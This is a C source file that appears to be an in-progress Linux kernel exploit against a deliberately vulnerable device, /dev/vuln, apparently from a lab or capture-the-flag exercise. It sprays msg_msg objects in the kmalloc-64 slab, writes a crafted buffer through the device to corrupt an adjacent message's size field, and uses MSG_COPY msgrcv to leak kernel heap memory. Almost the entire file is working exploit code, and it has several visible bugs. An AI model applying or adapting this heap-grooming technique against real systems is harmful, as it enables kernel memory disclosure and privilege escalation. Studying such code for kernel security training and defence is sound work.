#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <unistd.h>

#define PAGE_SIZE 4096
#define SLAB_NAME "kmalloc-64"
#define MSG_COPY 040000

int fd = -1;

void open_dev(){
	fd = open("/dev/vuln", O_RDWR);
	if(fd < 0){
		puts("[!] Error opening device");
		exit(-1);
	}
	puts("[*] Opened device");
}

void dev_write(char* buf, size_t n){
	if(write(fd, buf, n)<0) {
		puts("[!] Error writing to device");
		//exit(-1);
	} else {
		puts("[*] Wrote to device");
	}
}

char* dev_read(char* buf) {
	char* output = (char*)read(fd, buf, sizeof(buf));
	if (output <= 0){
		puts("[!] Error reading from device");
		exit(-1);
	}
	puts("[*] Read from device");
	return output;
}

// we want kmalloc-64
#define MSIZE 64-48

struct {
	long mtype;
	char mtext[MSIZE];
} msg;

void warm_heap(int n) {
	memset(msg.mtext, 0x69, MSIZE-1);
	msg.mtext[MSIZE] = 0;
	msg.mtype = 1;
	int msqids[n];
	size_t i;
	printf("[*] Allocating %d msg_msg\n", n);
	for(i=0; i<n; i++) {
		msqids[i] = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);
		if (msgsnd(msqids[i], &msg, sizeof(msg.mtext), 0) != 0)
			printf("[*] Error with msgsnd %d in warm_heap\n", msqids[i]);
	}
	printf("[*] Freeing %d msg_msg\n", n);
	for(i=0; i<n; i++) {
		if (msgrcv(msqids[i], &msg.mtext, sizeof(msg.mtext), 0, 0) == -1)
		      printf("[*] Error with msgrcv %d in spray_heap\n", msqids[i]);
	}
}

int alloc_msg(int type) {
	msg.mtype = type;
	int id = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);
	msgsnd(id, &msg, sizeof(msg.mtext), IPC_NOWAIT);
	return id;
	//msgrcv(id, &msg.mtext, sizeof(msg.mtext), 0, 0);
}

void hex_dump(unsigned long *buff, unsigned long size) {
	int i,j;
	for (i = 0; i < size/8; i++) {
		if(i % 2 == 0) {
			if (i != 0)
				printf("  \n");
		printf("  %04x  ", i*8);
		}
		unsigned long ptr = ((unsigned long *)(buff))[i];
		printf("0x%016lx", ptr);
		printf("    ");
	}
	printf("\n");
}

void check_slab(char *slab_name, int *active, int *total) {
	FILE *fp;
	char buff[1024], name[64];
	int active_num, total_num;
	fp = fopen("/proc/slabinfo", "r");
	if (!fp) {
		perror("fopen");
		return;
	}
	while (fgets(buff, 1024, fp) != NULL) {
		sscanf(buff, "%s %u %u", name, &active_num, &total_num);
		if (!strcmp(slab_name, name)) {
			*active = active_num;
			*total = total_num;
			return;
		}
	}
}

void print_slab_info() {
	int total_num, active_num;
	check_slab(SLAB_NAME, &active_num, &total_num);
	printf("[+] Checking slab total: %d active: %d free: %d\n",
		total_num, active_num, total_num-active_num);
}

void leak() {
	warm_heap(1000);
	size_t sz = PAGE_SIZE/sizeof(unsigned long);
	unsigned long evil[13];
	memset(evil, 0, 136);
	//evil[0] = 0xa;
	evil[8] = (unsigned long)0x4141414141414141;
	evil[9] = (unsigned long)0x4242424242424242; // struct list_head m_list;
	evil[10] = (unsigned long)0x000; // long m_type;
	int leak_sz = 0xfff;
	evil[11] = leak_sz; // size_t m_ts;
	// allocate many msg_msg
	// msg_msg | msg_msg | msg_msg | msg_msg
	int msqids[10];
	for(size_t i = 1; i < 11; i++) {
		msqids[i] = alloc_msg(i);
	}
	char buff[16];
	int res = msgrcv(msqids[5],  buff, 16, 5, IPC_NOWAIT);
	dev_write((char*)evil, 136);
	printf("[*] Free buffer to write into %d\n", res);
	// free some that are surrounded and then allocate our chunk in its place
	// msg_msg | free | msg_msg | msg_msg
	// since slab is FIFO the write will be
	// msg_msg | victim | msg_msg | msg_msg
        // overwrite freelist of next chunk
	char* leaked = (char*)calloc(leak_sz, sizeof(char));	
	puts("before msgrcv");
	res = msgrcv(msqids[4],  leaked, leak_sz, 0, MSG_COPY | IPC_NOWAIT);
	hex_dump(leaked, 0xff);
	printf("msgcrcv %d\n", res);	
	/*	if(res>0){
			printf("[*] Msgrcv %d\n", res);
			hex_dump((unsigned long*)leaked, leak_sz);
		}
	*/
}

int main() {
	open_dev();
	// warm heap to stop fragmentation
	leak();
}
